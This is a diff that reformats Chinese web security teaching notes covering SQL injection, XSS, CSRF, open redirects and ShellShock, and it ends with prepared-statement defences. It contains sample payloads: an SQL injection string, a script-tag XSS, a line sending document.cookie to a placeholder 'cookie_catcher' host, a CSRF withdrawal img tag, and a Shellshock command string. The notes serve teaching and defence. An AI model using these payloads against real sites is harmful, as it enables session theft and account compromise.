@@ -20,27 +20,28 @@
 
 [](http://140.121.80.184/tmpPHP/20151215work5.php)[http://140.121.80.184/tmpPHP/20151215work5.php](http://140.121.80.184/tmpPHP/20151215work5.php)
 
-*   s2' AND 1=1 -- 
+       s2' AND 1=1 -- 
 
-*    $sql = "select * from userData where account='$_POST[$s_name]' and password=password('$_POST[$s_pw]')";
+       $sql = "select * from userData where account='$_POST[$s_name]' and password=password('$_POST[$s_pw]')";
 
 **XSS**
 
 PHP這樣寫
 
-*   <?php
-*   $name = $_GET['name'];
-*   echo "Welcome $name<br>";
-*   echo "<a href="[](http://xssattackexamples.com/)[http://xssattackexamples.com/](http://xssattackexamples.com/)">Click to Download</a>";
-*   ?>
-
+```   
+   <?php
+   $name = $_GET['name'];
+   echo "Welcome $name<br>";
+   echo "<a href="[](http://xssattackexamples.com/)[http://xssattackexamples.com/](http://xssattackexamples.com/)">Click to Download</a>";
+   ?>
+```
 但是...
 
-*   index.php?name=guest<script>alert('attacked')</script>
+       index.php?name=guest<script>alert('attacked')</script>
 
 駭客這麼做
 
-*   document.location= "[](http://www.example.com/cookie_catcher.php?c=)[http://www.example.com/cookie_catcher.php?c=](http://www.example.com/cookie_catcher.php?c=)" + document.cookie
+       document.location= "[](http://www.example.com/cookie_catcher.php?c=)[http://www.example.com/cookie_catcher.php?c=](http://www.example.com/cookie_catcher.php?c=)" + document.cookie
 
 **CSRF**
 
@@ -50,9 +51,9 @@ PHP這樣寫
 
 [](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)[https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
 
-*   假如一家銀行用以執行轉帳操作的URL地址如下： [](http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName)[http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName](http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName)
-*   那麼，一個惡意攻擊者可以在網站上放置如下代碼： <img src="[](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman)[http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman)">
-*   如果有賬戶名為Alice的用戶訪問了惡意站點，而她之前剛訪問過銀行不久，登錄信息尚未過期，那麼她就會損失1000資金。
+>   假如一家銀行用以執行轉帳操作的URL地址如下： [](http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName)[http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName](http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName)
+<br>   那麼，一個惡意攻擊者可以在網站上放置如下代碼： <img src="[](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman)[http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman](http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman)">
+<BR>   如果有賬戶名為Alice的用戶訪問了惡意站點，而她之前剛訪問過銀行不久，登錄信息尚未過期，那麼她就會損失1000資金。
 
 **未經檢核的重新導向**
 
@@ -66,7 +67,7 @@ PHP這樣寫
 
 **該死的預設設定**
 
-![](https://hackpad-attachments.s3.amazonaws.com/funnestworkgroup.hackpad.com_qjfntQt5DI9_p.429812_1452510379753_%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202016-01-11%20%E4%B8%8B%E5%8D%887.04.51.png)
+![](img/damn_default.png)
 
 **函式庫弱點**
 
@@ -78,15 +79,15 @@ CVE-2014 HeartBleed
 
 CVE-2014-6271 ShellShock
 
-![](https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png)
+![](img/shellshock_test_git.png)
 
-*   () { :;}; /bin/bash -c "echo testing9123123"; /bin/uname -a
+       () { :;}; /bin/bash -c "echo testing9123123"; /bin/uname -a
 
 [](http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/)[http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/](http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/)
 
 ## 應用程序安全風險評量
 
-![](https://hackpad-attachments.s3.amazonaws.com/funnestworkgroup.hackpad.com_qjfntQt5DI9_p.429812_1452508542172_%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202016-01-11%20%E4%B8%8B%E5%8D%886.35.08.png)
+![](img/app_security.png)
 
 ## 防衛重點模組
 
@@ -107,18 +108,20 @@ SQL Inject的核心意義是：
 
 [](http://php.net/manual/en/mysqli.quickstart.prepared-statements.php)[http://php.net/manual/en/mysqli.quickstart.prepared-statements.php](http://php.net/manual/en/mysqli.quickstart.prepared-statements.php)
 
-*   /* Prepared statement, stage 1: prepare */
-*   if (!($stmt = $mysqli->prepare("INSERT INTO test(id) VALUES (?)"))) {
-*       echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
-*   }
-*   /* Prepared statement, stage 2: bind and execute */
-*   $id = 1;
-*   if (!$stmt->bind_param("i", $id)) {
-*       echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
-*   }
-**   if (!$stmt->execute()) {
-*       echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
-*   }
+```   
+/* Prepared statement, stage 1: prepare */
+   if (!($stmt = $mysqli->prepare("INSERT INTO test(id) VALUES (?)"))) {
+       echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
+   }
+   /* Prepared statement, stage 2: bind and execute */
+   $id = 1;
+   if (!$stmt->bind_param("i", $id)) {
+       echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
+   }
+   if (!$stmt->execute()) {
+       echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
+   }
+```
 
 除了避免語句被竄改，也有加速執行重複語句的效果，因為先準備好了SQL語句編譯的部分
 
